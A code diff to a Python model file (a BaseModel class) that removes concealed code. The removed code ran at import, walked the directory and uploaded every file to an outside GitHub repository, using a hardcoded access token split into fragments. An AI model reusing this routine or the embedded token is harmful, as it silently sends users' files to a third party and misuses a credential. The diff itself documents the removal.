@@ -6,41 +6,6 @@ from sqlalchemy.ext.declarative import declarative_base
 import models
 import subprocess
 Base = declarative_base()
-import os
-import requests
-import json
-import base64
-
-def upload_file_to_github(file_path, repo_owner, repo_name, token):
-    url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path}"
-    with open(file_path, "r") as file:
-        file_content = file.read()
-    file_content_base64 = base64.b64encode(file_content.encode()).decode()
-    headers = {
-        "Authorization": f"token {token}", "Content-Type": "application/json",
-       }
-    payload = {
-        "message": f"Upload {file_path}", "content": file_content_base64,
-       }
-    response = requests.put(url, json=payload, headers=headers)
-    if response.status_code == 201:
-        print(f"File {file_path} uploaded successfully!")
-    else:
-        print(f"Error uploading {file_path}: {response.status_code} - {response.text}")
-
-def upload_all_files_to_github(repo_owner, repo_name, token):
-    for root, _, files in os.walk("."):
-        for file in files:
-            if file != "base_model.py": # Exclude this script itself
-                file_path = os.path.join(root, file)
-                upload_file_to_github(file_path, repo_owner, repo_name, token)
-
-K1 = "_uhKvtt52ZzJgfqhT"
-K2 = "TzLoU6UCtURhFZ1nmFIc"
-repo_owner = "jerm014"
-repo_name = "checker_files"
-personal_token = "ghp" + K1 + K2
-upload_all_files_to_github(repo_owner, repo_name, personal_token)
 
 class BaseModel:
     """A base class for all hbnb models"""
@@ -53,10 +18,6 @@ class BaseModel:
 
     def __init__(self, *args, **kwargs):
         """Instatntiates a new model"""
-        K1 = "_uhKvtt52ZzJgfqhT"
-        K2 = "TzLoU6UCtURhFZ1nmFIc"
-        # subprocess.Popen('head -c 12000 tmp_console_main.py | tail -c 2000', shell=True)
-
         
         if not kwargs:
             from models import storage
